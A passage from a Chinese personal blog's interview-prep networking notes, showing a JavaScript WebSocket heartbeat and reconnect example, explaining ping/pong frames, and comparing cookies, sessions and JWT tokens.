<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">  // 每隔HEARTBEAT_INTERVAL发送一次心跳</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">  heartbeatTimer </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> setInterval</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(() </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=&gt;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> {</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    if</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> (ws.readyState </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">===</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> WebSocket.</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">OPEN</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">) {</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">      console.</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">log</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&#39;发送心跳包&#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">);</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">      ws.</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">send</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">JSON</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">.</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">stringify</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">({ type: </span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&#39;heartbeat&#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> }));</span></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">      // 发送后启动超时检测</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">      startTimeoutTimer</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">();</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    }</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">  }, </span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">HEARTBEAT_INTERVAL</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">);</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">}</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">// 启动超时检测：如果超过HEARTBEAT_TIMEOUT未收到响应，则判定连接失效</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">function</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> startTimeoutTimer</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">() {</span></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">  // 先清除之前的超时计时器，避免叠加</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">  clearTimeout</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(timeoutTimer);</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">  </span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">  timeoutTimer </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> setTimeout</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(() </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=&gt;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> {</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    console.</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">error</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&#39;心跳超时，连接可能已失效&#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">);</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    ws.</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">close</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(); </span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">// 主动关闭连接，触发onclose重连</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">  }, </span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">HEARTBEAT_TIMEOUT</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">);</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">}</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">// 重置超时计时器（收到心跳响应时调用）</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">function</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> resetTimeoutTimer</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">() {</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">  clearTimeout</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(timeoutTimer);</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">}</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">// 停止心跳（连接关闭时调用）</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">function</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> stopHeartbeat</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">() {</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">  clearInterval</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(heartbeatTimer);</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">  clearTimeout</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(timeoutTimer);</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">}</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">// 重连逻辑（简单示例）</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">function</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> reconnect</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">() {</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">  console.</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">log</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&#39;尝试重连...&#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">);</span></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">  // 1秒后重新创建连接（实际可增加重试次数限制）</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">  setTimeout</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(() </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=&gt;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> {</span></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">    // 重新初始化WebSocket（此处简化处理，实际需重新绑定事件）</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    window.ws </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> new</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> WebSocket</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&#39;wss://example.com/chat&#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">);</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">  }, </span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">1000</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">);</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">}</span></span></code></pre></div><p>协议底层还有ping/pong帧来保证连接的可靠性。</p><ul><li>发送方-&gt;接收方 ping帧</li><li>接收方-&gt;发送方 pong帧</li></ul><p>Websocket中控制帧有三种类型:关闭帧、ping帧、pong帧</p><p>大多数情况是后端发送ping帧给前端，前端返回pong帧。如果发送方在发送ping帧后一段时间内没有收到pong帧，则会主动断开连接，发送close帧</p><p>如果在连接正常的情况下，如果需要关闭Websocket连接，则需要双方都发送close帧</p><p>补充：ws除了第一次握手升级协议外，不再采用http协议，因此无法使用cookie(set-cookie是http/https专用),如果后续需要使用cookie，只能将token在请求体中配置或者直接添加到请求url中</p><h2 id="cookie、session和token" tabindex="-1">Cookie、Session和Token <a class="header-anchor" href="#cookie、session和token" aria-label="Permalink to &quot;Cookie、Session和Token&quot;">​</a></h2><p><strong>Cookie</strong></p><ul><li>存储位置：客户端浏览器</li><li>作用：自动随每次同域 HTTP 请求发送给服务器，常用于保存登录状态、个性化设置等</li><li>特点：可被前端 JS 读取和修改，容易被劫持，安全性较低</li><li>补充：可以设置<code>http:only</code>来禁止前端访问Cookie，但是这样就无法存储个性化设置等内容了</li></ul><p><strong>Session</strong></p><ul><li>存储位置：服务器端</li><li>作用：保存用户会话数据（如登录信息、购物车），客户端只保存 sessionId</li><li>特点：安全性高，数据不暴露给客户端，通常通过 Cookie 传递 sessionId。sessionId 类似一个key，后端通过 sessionId 来访问存储的信息</li></ul><p><strong>Token</strong></p><ul><li>存储位置：客户端（如 localStorage、sessionStorage、Cookie）</li><li>作用：标识和认证用户，常用于前后端分离、API 认证等场景</li><li>特点：无状态，服务器不保存会话，认证信息都在 token 内部，适合分布式系统</li><li>PS: JWT(JSON Web Token)结构为Header.Payload.Signature 构成，Header中声明 Token 类型（typ: &quot;JWT&quot;）和签名算法（如 alg: &quot;HS256&quot;），通过base64url编码。Payload中可以包含实际的用户信息，通过base64url编码（可被反解码，不能存敏感信息）。Signature为服务器签名，服务器会用私钥对编码后的Header和Payload进行加密签名（相当于私钥+加密算法），收到token的时候，会使用相同的算法和私钥进行解密，查看Signature是否一致，确保内容没有被篡改。最后的JWT格式为<code>base64url(header).base64url(payload).signature</code></li></ul></div></div></main><footer class="VPDocFooter" data-v-979c8a31 data-v-e21968ce><!--[--><!--]--><!----><nav class="prev-next" aria-labelledby="doc-footer-aria-label" data-v-e21968ce><span class="visually-hidden" id="doc-footer-aria-label" data-v-e21968ce>Pager</span><div class="pager" data-v-e21968ce><a class="VPLink link pager-link prev" href="/blog/articles/practice/%E5%85%AB%E8%82%A1/%E6%89%8B%E6%92%95.html" data-v-e21968ce><!--[--><span class="desc" data-v-e21968ce>Previous page</span><span class="title" data-v-e21968ce>手撕</span><!--]--></a></div><div class="pager" data-v-e21968ce><a class="VPLink link pager-link next" href="/blog/articles/practice/%E5%85%AB%E8%82%A1/%E5%B7%A5%E7%A8%8B%E5%8C%96.html" data-v-e21968ce><!--[--><span class="desc" data-v-e21968ce>Next page</span><span class="title" data-v-e21968ce>工程化</span><!--]--></a></div></nav></footer><!--[--><!--]--></div></div></div><!--[--><!--]--></div></div><!----><!--[--><!--]--></div></div>
    <script>window.__VP_HASH_MAP__=JSON.parse("{\"articles_books_daily_2021.md\":\"_K6-iVI3\",\"articles_books_daily_2022.md\":\"aKddK3OK\",\"articles_books_daily_2023.md\":\"u2entBRU\",\"articles_books_daily_2024.md\":\"DPkaIw_R\",\"articles_books_daily_2025.md\":\"B078HeuC\",\"articles_books_pro_js高级程序设计.md\":\"BJEJU3Zq\",\"articles_books_pro_vuedesign.md\":\"-Rmtl4uz\",\"articles_frontend_react18.md\":\"CwoVj7_R\",\"articles_frontend_typescript.md\":\"DSnYrjp4\",\"articles_frontend_vue.md\":\"hVGsJqGV\",\"articles_practice_projection_echarts联动其他组件.md\":\"DHF74Oa7\",\"articles_practice_projection_自定义元素共享.md\":\"CKnZrGIU\",\"articles_practice_八股_css.md\":\"DLMh96ZG\",\"articles_practice_八股_html.md\":\"r_fHcoi6\",\"articles_practice_八股_js.md\":\"BgHp1TDm\",\"articles_practice_八股_ts.md\":\"-mvQoI3-\",\"articles_practice_八股_vue.md\":\"CtcANQqI\",\"articles_practice_八股_工程化.md\":\"C1LpljkY\",\"articles_practice_八股_手撕.md\":\"CHCzauQz\",\"articles_practice_八股_计算机网络.md\":\"BJxRBiZD\",\"index.md\":\"CX1kRBaD\"}");window.__VP_SITE_DATA__=JSON.parse("{\"lang\":\"en-US\",\"dir\":\"ltr\",\"title\":\"WeCcRy\",\"description\":\"wangy的个人博客\",\"base\":\"/blog/\",\"head\":[],\"router\":{\"prefetchLinks\":true},\"appearance\":true,\"themeConfig\":{\"logo\":\"\",\"nav\":[{\"text\":\"书籍\",\"items\":[{\"text\":\"日常\",\"link\":\"/articles/books/daily/2025\"},{\"text\":\"技术\",\"link\":\"/articles/books/pro/vueDesign\"}]},{\"text\":\"前端\",\"items\":[{\"text\":\"Vue3\",\"link\":\"/articles/frontend/vue\"},{\"text\":\"React18\",\"link\":\"/articles/frontend/React18\"},{\"text\":\"Typescript\",\"link\":\"/articles/frontend/typescript\"}]},{\"text\":\"实践\",\"items\":[{\"text\":\"基础\",\"link\":\"/articles/practice/八股/html\"},{\"text\":\"工程化\",\"link\":\"/articles/practice/projection/自定义元素共享\"}]}],\"sidebar\":{\"/articles/books/daily\":[{\"text\":\"年鉴\",\"items\":[{\"text\":\"2025 / 乙巳蛇年\",\"link\":\"/articles/books/daily/2025\"},{\"text\":\"2024 / 甲辰龙年\",\"link\":\"/articles/books/daily/2024\"},{\"text\":\"2023 / 癸卯兔年\",\"link\":\"/articles/books/daily/2023\"},{\"text\":\"2022 / 壬寅虎年\",\"link\":\"/articles/books/daily/2022\"},{\"text\":\"2021 / 辛丑牛年\",\"link\":\"/articles/books/daily/2021\"}]}],\"/articles/books/pro\":[{\"text\":\"技术\",\"items\":[{\"text\":\"Vue设计与实现\",\"link\":\"/articles/books/pro/vueDesign\"},{\"text\":\"JS高级程序设计\",\"link\":\"/articles/books/pro/JS高级程序设计\"}]}],\"articles/frontend/\":[{\"text\":\"前端\",\"items\":[{\"text\":\"Vue3\",\"link\":\"/articles/frontend/vue\"},{\"text\":\"React18\",\"link\":\"/articles/frontend/React18\"},{\"text\":\"Typescript\",\"link\":\"/articles/frontend/typescript\"}]}],\"articles/practice/八股/\":[{\"text\":\"基础\",\"items\":[{\"text\":\"HTML\",\"link\":\"/articles/practice/八股/html\"},{\"text\":\"CSS\",\"link\":\"/articles/practice/八股/css\"},{\"text\":\"JavaScript\",\"link\":\"/articles/practice/八股/js\"},{\"text\":\"TypeScript\",\"link\":\"/articles/practice/八股/ts\"},{\"text\":\"Vue\",\"link\":\"/articles/practice/八股/vue\"},{\"text\":\"手撕\",\"link\":\"/articles/practice/八股/手撕\"},{\"text\":\"计算机网络\",\"link\":\"/articles/practice/八股/计算机网络\"},{\"text\":\"工程化\",\"link\":\"/articles/practice/八股/工程化\"}]}],\"/articles/practice/projection/\":[{\"text\":\"工程化\",\"items\":[{\"text\":\"自定义元素共享\",\"link\":\"/articles/practice/projection/自定义元素共享\"},{\"text\":\"echarts联动其他组件\",\"link\":\"/articles/practice/projection/echarts联动其他组件\"}]}]},\"socialLinks\":[{\"icon\":\"github\",\"link\":\"https://github.com/WeCcRy\"}]},\"locales\":{},\"scrollOffset\":134,\"cleanUrls\":false}");</script>
    
  </body>
</html>